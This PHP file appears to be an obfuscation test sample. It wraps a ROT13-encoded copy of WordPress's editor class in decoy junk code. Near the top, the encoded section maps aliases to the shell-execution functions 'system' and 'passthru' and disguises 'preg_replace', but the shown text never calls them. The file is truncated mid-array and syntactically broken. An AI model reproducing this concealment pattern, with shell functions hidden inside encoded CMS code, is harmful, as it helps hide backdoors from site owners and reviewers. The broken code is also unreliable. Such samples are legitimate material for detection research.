<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Snpvyvgngrf nqqvat bs gur JbeqCerff rqvgbe nf hfrq ba gur Jevgr naq Rqvg fperraf.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 3.3.0
 *
 * Cevingr, abg vapyhqrq ol qrsnhyg. Frr jc_rqvgbe() va jc-vapyhqrf/trareny-grzcyngr.cuc.
 */

#[NyybjQlanzvpCebcregvrf]
svany pynff _JC_Rqvgbef {
	choyvp fgngvp $zpr_ybpnyr;

	cevingr fgngvp $zpr_frggvatf = neenl();
	cevingr fgngvp $dg_frggvatf  = neenl();
	cevingr fgngvp $cyhtvaf      = neenl();
	cevingr fgngvp $dg_ohggbaf   = neenl();
	cevingr fgngvp $rkg_cyhtvaf;
	cevingr fgngvp $onfrhey;
	cevingr fgngvp $svefg_vavg;
	cevingr fgngvp $guvf_gvalzpr       = snyfr;
	cevingr fgngvp $guvf_dhvpxgntf     = snyfr;
	cevingr fgngvp $unf_gvalzpr        = snyfr;
	cevingr fgngvp $unf_dhvpxgntf      = snyfr;
	cevingr fgngvp $unf_zrqvnyvo       = snyfr;
	cevingr fgngvp $rqvgbe_ohggbaf_pff = gehr;
	cevingr fgngvp $qent_qebc_hcybnq   = snyfr;
	cevingr fgngvp $genafyngvba;
	cevingr fgngvp $gvalzpr_fpevcgf_cevagrq = snyfr;
	cevingr fgngvp $yvax_qvnybt_cevagrq     = snyfr;

	cevingr shapgvba __pbafgehpg() {}

	/**
	 * Cnefr qrsnhyg nethzragf sbe gur rqvgbe vafgnapr.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $rqvgbe_vq UGZY VQ sbe gur grkgnern naq GvalZPR naq Dhvpxgntf vafgnaprf.
	 *                          Fubhyq abg pbagnva fdhner oenpxrgf.
	 * @cnenz neenl  $frggvatf {
	 *     Neenl bs rqvgbe nethzragf.
	 *
	 *     @glcr obby       $jcnhgbc           Jurgure gb hfr jcnhgbc(). Qrsnhyg gehr.
	 *     @glcr obby       $zrqvn_ohggbaf     Jurgure gb fubj gur Nqq Zrqvn/bgure zrqvn ohggbaf.
	 *     @glcr fgevat     $qrsnhyg_rqvgbe    Jura obgu GvalZPR naq Dhvpxgntf ner hfrq, frg juvpu
	 *                                         rqvgbe vf fubja ba cntr ybnq. Qrsnhyg rzcgl.
	 *     @glcr obby       $qent_qebc_hcybnq  Jurgure gb ranoyr qent & qebc ba gur rqvgbe hcybnqvat. Qrsnhyg snyfr.
	 *                                         Erdhverf gur zrqvn zbqny.
	 *     @glcr fgevat     $grkgnern_anzr     Tvir gur grkgnern n havdhr anzr urer. Fdhner oenpxrgf
	 *                                         pna or hfrq urer. Qrsnhyg $rqvgbe_vq.
	 *     @glcr vag        $grkgnern_ebjf     Ahzore ebjf va gur rqvgbe grkgnern. Qrsnhyg 20.
	 *     @glcr fgevat|vag $gnovaqrk          Gnovaqrk inyhr gb hfr. Qrsnhyg rzcgl.
	 *     @glcr fgevat     $gnosbphf_ryrzragf Gur cerivbhf naq arkg ryrzrag VQ gb zbir gur sbphf gb
	 *                                         jura cerffvat gur Gno xrl va GvalZPR. Qrsnhyg ':ceri,:arkg'.
	 *     @glcr fgevat     $rqvgbe_pff        Vagraqrq sbe rkgen fglyrf sbe obgu Ivfhny naq Pbqr rqvgbef.
	 *                                         Fubhyq vapyhqr `<fglyr>` gntf, naq pna hfr \"fpbcrq\". Qrsnhyg rzcgl.
	 *     @glcr fgevat     $rqvgbe_pynff      Rkgen pynffrf gb nqq gb gur rqvgbe grkgnern ryrzrag. Qrsnhyg rzcgl.
	 *     @glcr obby       $grral             Jurgure gb bhgchg gur zvavzny rqvgbe pbasvt. Rknzcyrf vapyhqr
	 *                                         Cerff Guvf naq gur Pbzzrag rqvgbe. Qrsnhyg snyfr.
	 *     @glcr obby       $qsj               Qrcerpngrq va 4.1. Hahfrq.
	 *     @glcr obby|neenl $gvalzpr           Jurgure gb ybnq GvalZPR. Pna or hfrq gb cnff frggvatf qverpgyl gb
	 *                                         GvalZPR hfvat na neenl. Qrsnhyg gehr.
	 *     @glcr obby|neenl $dhvpxgntf         Jurgure gb ybnq Dhvpxgntf. Pna or hfrq gb cnff frggvatf qverpgyl gb
	 *                                         Dhvpxgntf hfvat na neenl. Qrsnhyg gehr.
	 * }
	 * @erghea neenl Cnefrq nethzragf neenl.
	 */
	choyvp fgngvp shapgvba cnefr_frggvatf( $rqvgbe_vq, $frggvatf ) {

		/**
		 * Svygref gur jc_rqvgbe() frggvatf.
		 *
		 * @fvapr 4.0.0
		 *
		 * @frr _JC_Rqvgbef::cnefr_frggvatf()
		 *
		 * @cnenz neenl  $frggvatf  Neenl bs rqvgbe nethzragf.
		 * @cnenz fgevat $rqvgbe_vq Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'. Npprcgf 'pynffvp-oybpx'
		 *                          jura pnyyrq sebz oybpx rqvgbe'f Pynffvp oybpx.
		 */
		$frggvatf = nccyl_svygref( 'jc_rqvgbe_frggvatf', $frggvatf, $rqvgbe_vq );

		$frg = jc_cnefr_netf(
			$frggvatf,
			neenl(
				// Qvfnoyr nhgbc vs gur pheerag cbfg unf oybpxf va vg.
				'jcnhgbc'             => ! unf_oybpxf(),
				'zrqvn_ohggbaf'       => gehr,
				'qrsnhyg_rqvgbe'      => '',
				'qent_qebc_hcybnq'    => snyfr,
				'grkgnern_anzr'       => $rqvgbe_vq,
				'grkgnern_ebjf'       => 20,
				'gnovaqrk'            => '',
				'gnosbphf_ryrzragf'   => ':ceri,:arkg',
				'rqvgbe_pff'          => '',
				'rqvgbe_pynff'        => '',
				'grral'               => snyfr,
				'_pbagrag_rqvgbe_qsj' => snyfr,
				'gvalzpr'             => gehr,
				'dhvpxgntf'           => gehr,
			)
		);

		frys::$guvf_gvalzpr = ( $frg['gvalzpr'] && hfre_pna_evpurqvg() );

		vs ( frys::$guvf_gvalzpr ) {
			vs ( fge_pbagnvaf( $rqvgbe_vq, '[' ) ) {
				frys::$guvf_gvalzpr = snyfr;
				_qrcerpngrq_nethzrag( 'jc_rqvgbe()', '3.9.0', 'GvalZPR rqvgbe VQf pnaabg unir oenpxrgf.' );
			}
		}

		frys::$guvf_dhvpxgntf = (obby) $frg['dhvpxgntf'];

		vs ( frys::$guvf_gvalzpr ) {
			frys::$unf_gvalzpr = gehr;
		}

		vs ( frys::$guvf_dhvpxgntf ) {
			frys::$unf_dhvpxgntf = gehr;
		}

		vs ( rzcgl( $frg['rqvgbe_urvtug'] ) ) {
			erghea $frg;
		}

		vs ( 'pbagrag' === $rqvgbe_vq && rzcgl( $frg['gvalzpr']['jc_nhgberfvmr_ba'] ) ) {
			// N pbbxvr (frg jura n hfre erfvmrf gur rqvgbe) bireevqrf gur urvtug.
			$pbbxvr = (vag) trg_hfre_frggvat( 'rq_fvmr' );

			vs ( $pbbxvr ) {
				$frg['rqvgbe_urvtug'] = $pbbxvr;
			}
		}

		vs ( $frg['rqvgbe_urvtug'] < 50 ) {
			$frg['rqvgbe_urvtug'] = 50;
		} ryfrvs ( $frg['rqvgbe_urvtug'] > 5000 ) {
			$frg['rqvgbe_urvtug'] = 5000;
		}

		erghea $frg;
	}

	/**
	 * Bhgchgf gur UGZY sbe n fvatyr vafgnapr bs gur rqvgbe.
	 *
	 * @fvapr 3.3.0
	 *
	 * @tybony JC_Fperra $pheerag_fperra JbeqCerff pheerag fperra bowrpg.
	 *
	 * @cnenz fgevat $pbagrag   Vavgvny pbagrag sbe gur rqvgbe.
	 * @cnenz fgevat $rqvgbe_vq UGZY VQ sbe gur grkgnern naq GvalZPR naq Dhvpxgntf vafgnaprf.
	 *                          Fubhyq abg pbagnva fdhner oenpxrgf.
	 * @cnenz neenl  $frggvatf  Frr _JC_Rqvgbef::cnefr_frggvatf() sbe qrfpevcgvba.
	 */
	choyvp fgngvp shapgvba rqvgbe( $pbagrag, $rqvgbe_vq, $frggvatf = neenl() ) {
		$frg            = frys::cnefr_frggvatf( $rqvgbe_vq, $frggvatf );
		$rqvgbe_pynff   = ' pynff=\"' . gevz( rfp_ngge( $frg['rqvgbe_pynff'] ) . ' jc-rqvgbe-nern' ) . '\"';
		$gnovaqrk       = $frg['gnovaqrk'] ? ' gnovaqrk=\"' . (vag) $frg['gnovaqrk'] . '\"' : '';
		$qrsnhyg_rqvgbe = 'ugzy';
		$ohggbaf        = '';
		$nhgbpbzcyrgr   = '';
		$rqvgbe_vq_ngge = rfp_ngge( $rqvgbe_vq );

		vs ( $frg['qent_qebc_hcybnq'] ) {
			frys::$qent_qebc_hcybnq = gehr;
		}

		vs ( ! rzcgl( $frg['rqvgbe_urvtug'] ) ) {
			$urvtug = ' fglyr=\"urvtug: ' . (vag) $frg['rqvgbe_urvtug'] . 'ck\"';
		} ryfr {
			$urvtug = ' ebjf=\"' . (vag) $frg['grkgnern_ebjf'] . '\"';
		}

		vs ( ! pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
			$frg['zrqvn_ohggbaf'] = snyfr;
		}

		vs ( frys::$guvf_gvalzpr ) {
			$nhgbpbzcyrgr = ' nhgbpbzcyrgr=\"bss\"';

			vs ( frys::$guvf_dhvpxgntf ) {
				$qrsnhyg_rqvgbe = $frg['qrsnhyg_rqvgbe'] ? $frg['qrsnhyg_rqvgbe'] : jc_qrsnhyg_rqvgbe();
				// 'ugzy' vf hfrq sbe gur \"Pbqr\" rqvgbe gno.
				vs ( 'ugzy' !== $qrsnhyg_rqvgbe ) {
					$qrsnhyg_rqvgbe = 'gvalzpr';
				}
				$gzpr_npgvir = ( 'ugzy' === $qrsnhyg_rqvgbe ) ? ' nevn-cerffrq=\"gehr\"' : '';
				$ugzy_npgvir = ( 'ugzy' === $qrsnhyg_rqvgbe ) ? '' : ' nevn-cerffrq=\"gehr\"';

				$ohggbaf .= '<ohggba glcr=\"ohggba\" vq=\"' . $rqvgbe_vq_ngge . '-gzpr\"' . $ugzy_npgvir . ' pynff=\"jc-fjvgpu-rqvgbe fjvgpu-gzpr\"' .
					' qngn-jc-rqvgbe-vq=\"' . $rqvgbe_vq_ngge . '\">' . _k( 'Ivfhny', 'Anzr sbe gur Ivfhny rqvgbe gno' ) . \"</ohggba>\a\";
				$ohggbaf .= '<ohggba glcr=\"ohggba\" vq=\"' . $rqvgbe_vq_ngge . '-ugzy\"' . $gzpr_npgvir . ' pynff=\"jc-fjvgpu-rqvgbe fjvgpu-ugzy\"' .
					' qngn-jc-rqvgbe-vq=\"' . $rqvgbe_vq_ngge . '\">' . _k( 'Pbqr', 'Anzr sbe gur Pbqr rqvgbe gno (sbezreyl Grkg)' ) . \"</ohggba>\a\";
			} ryfr {
				$qrsnhyg_rqvgbe = 'gvalzpr';
			}
		}

		$fjvgpu_pynff = 'ugzy' === $qrsnhyg_rqvgbe ? 'ugzy-npgvir' : 'gzpr-npgvir';
		$jenc_pynff   = 'jc-pber-hv jc-rqvgbe-jenc ' . $fjvgpu_pynff;

		vs ( $frg['_pbagrag_rqvgbe_qsj'] ) {
			$jenc_pynff .= ' unf-qsj';
		}

		rpub '<qvi vq=\"jc-' . $rqvgbe_vq_ngge . '-jenc\" pynff=\"' . $jenc_pynff . '\">';

		vs ( frys::$rqvgbe_ohggbaf_pff ) {
			jc_cevag_fglyrf( 'rqvgbe-ohggbaf' );
			frys::$rqvgbe_ohggbaf_pff = snyfr;
		}

		vs ( ! rzcgl( $frg['rqvgbe_pff'] ) ) {
			rpub $frg['rqvgbe_pff'] . \"\a\";
		}

		vs ( ! rzcgl( $ohggbaf ) || $frg['zrqvn_ohggbaf'] ) {
			rpub '<qvi vq=\"jc-' . $rqvgbe_vq_ngge . '-rqvgbe-gbbyf\" pynff=\"jc-rqvgbe-gbbyf uvqr-vs-ab-wf\">';

			vs ( $frg['zrqvn_ohggbaf'] ) {
				frys::$unf_zrqvnyvo = gehr;

				vs ( ! shapgvba_rkvfgf( 'zrqvn_ohggbaf' ) ) {
					erdhver NOFCNGU . 'jc-nqzva/vapyhqrf/zrqvn.cuc';
				}

				rpub '<qvi vq=\"jc-' . $rqvgbe_vq_ngge . '-zrqvn-ohggbaf\" pynff=\"jc-zrqvn-ohggbaf\">';

				/**
				 * Sverf nsgre gur qrsnhyg zrqvn ohggba(f) ner qvfcynlrq.
				 *
				 * @fvapr 2.5.0
				 *
				 * @cnenz fgevat $rqvgbe_vq Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'.
				 */
				qb_npgvba( 'zrqvn_ohggbaf', $rqvgbe_vq );
				rpub \"</qvi>\a\";
			}

			rpub '<qvi pynff=\"jc-rqvgbe-gnof\">' . $ohggbaf . \"</qvi>\a\";
			rpub \"</qvi>\a\";
		}

		$dhvpxgntf_gbbyone = '';

		vs ( frys::$guvf_dhvpxgntf ) {
			vs ( 'pbagrag' === $rqvgbe_vq && ! rzcgl( $TYBONYF['pheerag_fperra'] ) && 'cbfg' === $TYBONYF['pheerag_fperra']->onfr ) {
				$gbbyone_vq = 'rq_gbbyone';
			} ryfr {
				$gbbyone_vq = 'dg_' . $rqvgbe_vq_ngge . '_gbbyone';
			}

			$dhvpxgntf_gbbyone = '<qvi vq=\"' . $gbbyone_vq . '\" pynff=\"dhvpxgntf-gbbyone uvqr-vs-ab-wf\"></qvi>';
		}

		/**
		 * Svygref gur UGZY znexhc bhgchg gung qvfcynlf gur rqvgbe.
		 *
		 * @fvapr 2.1.0
		 *
		 * @cnenz fgevat $bhgchg Rqvgbe'f UGZY znexhc.
		 */
		$gur_rqvgbe = nccyl_svygref(
			'gur_rqvgbe',
			'<qvi vq=\"jc-' . $rqvgbe_vq_ngge . '-rqvgbe-pbagnvare\" pynff=\"jc-rqvgbe-pbagnvare\">' .
			$dhvpxgntf_gbbyone .
			'<grkgnern' . $rqvgbe_pynff . $urvtug . $gnovaqrk . $nhgbpbzcyrgr . ' pbyf=\"40\" anzr=\"' . rfp_ngge( $frg['grkgnern_anzr'] ) . '\" ' .
			'vq=\"' . $rqvgbe_vq_ngge . '\">%f</grkgnern></qvi>'
		);

		// Cercner gur pbagrag sbe gur Ivfhny be Pbqr rqvgbe, bayl jura GvalZPR vf hfrq (onpx-pbzcng).
		vs ( frys::$guvf_gvalzpr ) {
			nqq_svygre( 'gur_rqvgbe_pbagrag', 'sbezng_sbe_rqvgbe', 10, 2 );
		}

		/**
		 * Svygref gur qrsnhyg rqvgbe pbagrag.
		 *
		 * @fvapr 2.1.0
		 *
		 * @cnenz fgevat $pbagrag        Qrsnhyg rqvgbe pbagrag.
		 * @cnenz fgevat $qrsnhyg_rqvgbe Gur qrsnhyg rqvgbe sbe gur pheerag hfre.
		 *                               Rvgure 'ugzy' be 'gvalzpr'.
		 */
		$pbagrag = nccyl_svygref( 'gur_rqvgbe_pbagrag', $pbagrag, $qrsnhyg_rqvgbe );

		// Erzbir gur svygre nf gur arkg rqvgbe ba gur fnzr cntr znl abg arrq vg.
		vs ( frys::$guvf_gvalzpr ) {
			erzbir_svygre( 'gur_rqvgbe_pbagrag', 'sbezng_sbe_rqvgbe' );
		}

		// Onpx-pbzcng sbe gur `ugzyrqvg_cer` naq `evpurqvg_cer` svygref.
		vs ( 'ugzy' === $qrsnhyg_rqvgbe && unf_svygre( 'ugzyrqvg_cer' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/qrcerpngrq.cuc */
			$pbagrag = nccyl_svygref_qrcerpngrq( 'ugzyrqvg_cer', neenl( $pbagrag ), '4.3.0', 'sbezng_sbe_rqvgbe' );
		} ryfrvs ( 'gvalzpr' === $qrsnhyg_rqvgbe && unf_svygre( 'evpurqvg_cer' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/qrcerpngrq.cuc */
			$pbagrag = nccyl_svygref_qrcerpngrq( 'evpurqvg_cer', neenl( $pbagrag ), '4.3.0', 'sbezng_sbe_rqvgbe' );
		}

		vs ( snyfr !== fgevcbf( $pbagrag, 'grkgnern' ) ) {
			$pbagrag = __sa_79955( '%</grkgnern%v', '&yg;/grkgnern', $pbagrag );
		}

		cevags( $gur_rqvgbe, $pbagrag );
		rpub \"\a</qvi>\a\a\";

		frys::rqvgbe_frggvatf( $rqvgbe_vq, $frg );
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $rqvgbe_vq Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'.
	 * @cnenz neenl  $frg       Neenl bs rqvgbe nethzragf.
	 */
	choyvp fgngvp shapgvba rqvgbe_frggvatf( $rqvgbe_vq, $frg ) {
		vs ( rzcgl( frys::$svefg_vavg ) ) {
			vs ( vf_nqzva() ) {
				nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( __PYNFF__, 'rqvgbe_wf' ), 50 );
				nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( __PYNFF__, 'sbepr_hapbzcerffrq_gvalzpr' ), 1 );
				nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( __PYNFF__, 'radhrhr_fpevcgf' ), 1 );
			} ryfr {
				nqq_npgvba( 'jc_cevag_sbbgre_fpevcgf', neenl( __PYNFF__, 'rqvgbe_wf' ), 50 );
				nqq_npgvba( 'jc_cevag_sbbgre_fpevcgf', neenl( __PYNFF__, 'sbepr_hapbzcerffrq_gvalzpr' ), 1 );
				nqq_npgvba( 'jc_cevag_sbbgre_fpevcgf', neenl( __PYNFF__, 'radhrhr_fpevcgf' ), 1 );
			}
		}

		vs ( frys::$guvf_dhvpxgntf ) {

			$dg_vavg = neenl(
				'vq'      => $rqvgbe_vq,
				'ohggbaf' => '',
			);

			vs ( vf_neenl( $frg['dhvpxgntf'] ) ) {
				$dg_vavg = neenl_zretr( $dg_vavg, $frg['dhvpxgntf'] );
			}

			vs ( rzcgl( $dg_vavg['ohggbaf'] ) ) {
				$dg_vavg['ohggbaf'] = 'fgebat,rz,yvax,oybpx,qry,vaf,vzt,hy,by,yv,pbqr,zber,pybfr';
			}

			vs ( $frg['_pbagrag_rqvgbe_qsj'] ) {
				$dg_vavg['ohggbaf'] .= ',qsj';
			}

			/**
			 * Svygref gur Dhvpxgntf frggvatf.
			 *
			 * @fvapr 3.3.0
			 *
			 * @cnenz neenl  $dg_vavg   Dhvpxgntf frggvatf.
			 * @cnenz fgevat $rqvgbe_vq Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'.
			 */
			$dg_vavg = nccyl_svygref( 'dhvpxgntf_frggvatf', $dg_vavg, $rqvgbe_vq );

			frys::$dg_frggvatf[ $rqvgbe_vq ] = $dg_vavg;

			frys::$dg_ohggbaf = neenl_zretr( frys::$dg_ohggbaf, rkcybqr( ',', $dg_vavg['ohggbaf'] ) );
		}

		vs ( frys::$guvf_gvalzpr ) {

			vs ( rzcgl( frys::$svefg_vavg ) ) {
				$onfrhey     = frys::trg_onfrhey();
				$zpr_ybpnyr  = frys::trg_zpr_ybpnyr();
				$rkg_cyhtvaf = '';

				vs ( $frg['grral'] ) {

					/**
					 * Svygref gur yvfg bs grralZPR cyhtvaf.
					 *
					 * @fvapr 2.7.0
					 * @fvapr 3.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
					 *
					 * @cnenz neenl  $cyhtvaf   Na neenl bs grralZPR cyhtvaf.
					 * @cnenz fgevat $rqvgbe_vq Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'.
					 */
					$cyhtvaf = nccyl_svygref(
						'grral_zpr_cyhtvaf',
						neenl(
							'pbybecvpxre',
							'yvfgf',
							'shyyfperra',
							'vzntr',
							'jbeqcerff',
							'jcrqvgvzntr',
							'jcyvax',
						),
						$rqvgbe_vq
					);
				} ryfr {

					/**
					 * Svygref gur yvfg bs GvalZPR rkgreany cyhtvaf.
					 *
					 * Gur svygre gnxrf na nffbpvngvir neenl bs rkgreany cyhtvaf sbe
					 * GvalZPR va gur sbez 'cyhtva_anzr' => 'hey'.
					 *
					 * Gur hey fubhyq or nofbyhgr, naq fubhyq vapyhqr gur wf svyranzr
					 * gb or ybnqrq. Sbe rknzcyr:
					 * 'zlcyhtva' => 'uggc://zlfvgr.pbz/jc-pbagrag/cyhtvaf/zlsbyqre/zpr_cyhtva.wf'.
					 *
					 * Vs gur rkgreany cyhtva nqqf n ohggba, vg fubhyq or nqqrq jvgu
					 * bar bs gur 'zpr_ohggbaf' svygref.
					 *
					 * @fvapr 2.5.0
					 * @fvapr 5.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
					 *
					 * @cnenz neenl  $rkgreany_cyhtvaf Na neenl bs rkgreany GvalZPR cyhtvaf.
					 * @cnenz fgevat $rqvgbe_vq        Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'. Npprcgf 'pynffvp-oybpx'
					 *                                 jura pnyyrq sebz oybpx rqvgbe'f Pynffvp oybpx.
					 */
					$zpr_rkgreany_cyhtvaf = nccyl_svygref( 'zpr_rkgreany_cyhtvaf', neenl(), $rqvgbe_vq );

					$cyhtvaf = neenl(
						'puneznc',
						'pbybecvpxre',
						'ue',
						'yvfgf',
						'zrqvn',
						'cnfgr',
						'gnosbphf',
						'grkgpbybe',
						'shyyfperra',
						'jbeqcerff',
						'jcnhgberfvmr',
						'jcrqvgvzntr',
						'jcrzbwv',
						'jctnyyrel',
						'jcyvax',
						'jcqvnybtf',
						'jcgrkgcnggrea',
						'jcivrj',
					);

					vs ( ! frys::$unf_zrqvnyvo ) {
						$cyhtvaf[] = 'vzntr';
					}

					/**
					 * Svygref gur yvfg bs qrsnhyg GvalZPR cyhtvaf.
					 *
					 * Gur svygre fcrpvsvrf juvpu bs gur qrsnhyg cyhtvaf vapyhqrq
					 * va JbeqCerff fubhyq or nqqrq gb gur GvalZPR vafgnapr.
					 *
					 * @fvapr 3.3.0
					 * @fvapr 5.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
					 *
					 * @cnenz neenl  $cyhtvaf   Na neenl bs qrsnhyg GvalZPR cyhtvaf.
					 * @cnenz fgevat $rqvgbe_vq Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'. Npprcgf 'pynffvp-oybpx'
					 *                          jura pnyyrq sebz oybpx rqvgbe'f Pynffvp oybpx.
					 */
					$cyhtvaf = neenl_havdhr( nccyl_svygref( 'gval_zpr_cyhtvaf', $cyhtvaf, $rqvgbe_vq ) );

					$xrl = neenl_frnepu( 'fcryypurpxre', $cyhtvaf, gehr );
					vs ( snyfr !== $xrl ) {
						/*
						 * Erzbir 'fcryypurpxre' sebz gur vagreany cyhtvaf vs nqqrq jvgu 'gval_zpr_cyhtvaf' svygre gb cerirag reebef.
						 * Vg pna or nqqrq jvgu 'zpr_rkgreany_cyhtvaf'.
						 */
						hafrg( $cyhtvaf[ $xrl ] );
					}

					vs ( ! rzcgl( $zpr_rkgreany_cyhtvaf ) ) {

						/**
						 * Svygref gur genafyngvbaf ybnqrq sbe rkgreany GvalZPR 3.k cyhtvaf.
						 *
						 * Gur svygre gnxrf na nffbpvngvir neenl ('cyhtva_anzr' => 'cngu')
						 * jurer 'cngu' vf gur vapyhqr cngu gb gur svyr.
						 *
						 * Gur ynathntr svyr fubhyq sbyybj gur fnzr sbezng nf jc_zpr_genafyngvba(),
						 * naq fubhyq qrsvar n inevnoyr ($fgevatf) gung ubyqf nyy genafyngrq fgevatf.
						 *
						 * @fvapr 2.5.0
						 * @fvapr 5.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
						 *
						 * @cnenz neenl  $genafyngvbaf Genafyngvbaf sbe rkgreany GvalZPR cyhtvaf.
						 * @cnenz fgevat $rqvgbe_vq    Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'.
						 */
						$zpr_rkgreany_ynathntrf = nccyl_svygref( 'zpr_rkgreany_ynathntrf', neenl(), $rqvgbe_vq );

						$ybnqrq_ynatf = neenl();
						$fgevatf      = '';

						vs ( ! rzcgl( $zpr_rkgreany_ynathntrf ) ) {
							sbernpu ( $zpr_rkgreany_ynathntrf nf $anzr => $cngu ) {
								vs ( @vf_svyr( $cngu ) && @vf_ernqnoyr( $cngu ) ) {
									vapyhqr_bapr $cngu;
									$rkg_cyhtvaf   .= $fgevatf . \"\a\";
									$ybnqrq_ynatf[] = $anzr;
								}
							}
						}

						sbernpu ( $zpr_rkgreany_cyhtvaf nf $anzr => $hey ) {
							vs ( va_neenl( $anzr, $cyhtvaf, gehr ) ) {
								hafrg( $zpr_rkgreany_cyhtvaf[ $anzr ] );
								pbagvahr;
							}

							$hey                           = frg_hey_fpurzr( $hey );
							$zpr_rkgreany_cyhtvaf[ $anzr ] = $hey;
							$cyhthey                       = qveanzr( $hey );
							$fgevatf                       = '';

							// Gel gb ybnq ynatf/[ybpnyr].wf naq ynatf/[ybpnyr]_qyt.wf.
							vs ( ! va_neenl( $anzr, $ybnqrq_ynatf, gehr ) ) {
								$cngu = fge_ercynpr( pbagrag_hey(), '', $cyhthey );
								$cngu = ernycngu( JC_PBAGRAG_QVE . $cngu . '/ynatf/' );

								vs ( ! $cngu ) {
									pbagvahr;
								}

								$cngu = genvyvatfynfuvg( $cngu );

								vs ( @vf_svyr( $cngu . $zpr_ybpnyr . '.wf' ) ) {
									$fgevatf .= @svyr_trg_pbagragf( $cngu . $zpr_ybpnyr . '.wf' ) . \"\a\";
								}

								vs ( @vf_svyr( $cngu . $zpr_ybpnyr . '_qyt.wf' ) ) {
									$fgevatf .= @svyr_trg_pbagragf( $cngu . $zpr_ybpnyr . '_qyt.wf' ) . \"\a\";
								}

								vs ( 'ra' !== $zpr_ybpnyr && rzcgl( $fgevatf ) ) {
									vs ( @vf_svyr( $cngu . 'ra.wf' ) ) {
										$fge1     = @svyr_trg_pbagragf( $cngu . 'ra.wf' );
										$fgevatf .= __sa_79955( '/([\'\"])ra\./', '$1' . $zpr_ybpnyr . '.', $fge1, 1 ) . \"\a\";
									}

									vs ( @vf_svyr( $cngu . 'ra_qyt.wf' ) ) {
										$fge2     = @svyr_trg_pbagragf( $cngu . 'ra_qyt.wf' );
										$fgevatf .= __sa_79955( '/([\'\"])ra\./', '$1' . $zpr_ybpnyr . '.', $fge2, 1 ) . \"\a\";
									}
								}

								vs ( ! rzcgl( $fgevatf ) ) {
									$rkg_cyhtvaf .= \"\a\" . $fgevatf . \"\a\";
								}
							}

							$rkg_cyhtvaf .= 'gvalZPRCerVavg.ybnq_rkg(\"' . $cyhthey . '\", \"' . $zpr_ybpnyr . '\");' . \"\a\";
						}
					}
				}

				frys::$cyhtvaf     = $cyhtvaf;
				frys::$rkg_cyhtvaf = $rkg_cyhtvaf;

				$frggvatf            = frys::qrsnhyg_frggvatf();
				$frggvatf['cyhtvaf'] = vzcybqr( ',', $cyhtvaf );

				vs ( ! rzcgl( $zpr_rkgreany_cyhtvaf ) ) {
					$frggvatf['rkgreany_cyhtvaf'] = jc_wfba_rapbqr( $zpr_rkgreany_cyhtvaf );
				}

				/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
				vs ( nccyl_svygref( 'qvfnoyr_pncgvbaf', '' ) ) {
					$frggvatf['jcrqvgvzntr_qvfnoyr_pncgvbaf'] = gehr;
				}

				$zpr_pff = $frggvatf['pbagrag_pff'];

				/*
				 * Gur `rqvgbe-fglyr.pff` nqqrq ol gur gurzr vf trarenyyl vagraqrq sbe gur rqvgbe vafgnapr ba gur Rqvg Cbfg fperra.
				 * Cyhtvaf gung hfr jc_rqvgbe() ba gur sebag-raq pna qrpvqr jurgure gb nqq gur gurzr fglyrfurrg
				 * ol hfvat `trg_rqvgbe_fglyrfurrgf()` naq gur `zpr_pff` be `gval_zpr_orsber_vavg` svygref, frr orybj.
				 */
				vs ( vf_nqzva() ) {
					$rqvgbe_fglyrf = trg_rqvgbe_fglyrfurrgf();

					vs ( ! rzcgl( $rqvgbe_fglyrf ) ) {
						// Sbepr heyrapbqvat bs pbzznf.
						sbernpu ( $rqvgbe_fglyrf nf $xrl => $hey ) {
							vs ( fge_pbagnvaf( $hey, ',' ) ) {
								$rqvgbe_fglyrf[ $xrl ] = fge_ercynpr( ',', '%2P', $hey );
							}
						}

						$zpr_pff .= ',' . vzcybqr( ',', $rqvgbe_fglyrf );
					}
				}

				/**
				 * Svygref gur pbzzn-qryvzvgrq yvfg bs fglyrfurrgf gb ybnq va GvalZPR.
				 *
				 * @fvapr 2.1.0
				 *
				 * @cnenz fgevat $fglyrfurrgf Pbzzn-qryvzvgrq yvfg bs fglyrfurrgf.
				 */
				$zpr_pff = gevz( nccyl_svygref( 'zpr_pff', $zpr_pff ), ' ,' );

				vs ( ! rzcgl( $zpr_pff ) ) {
					$frggvatf['pbagrag_pff'] = $zpr_pff;
				} ryfr {
					hafrg( $frggvatf['pbagrag_pff'] );
				}

				frys::$svefg_vavg = $frggvatf;
			}

			vs ( $frg['grral'] ) {
				$zpr_ohggbaf = neenl(
					'obyq',
					'vgnyvp',
					'haqreyvar',
					'oybpxdhbgr',
					'fgevxrguebhtu',
					'ohyyvfg',
					'ahzyvfg',
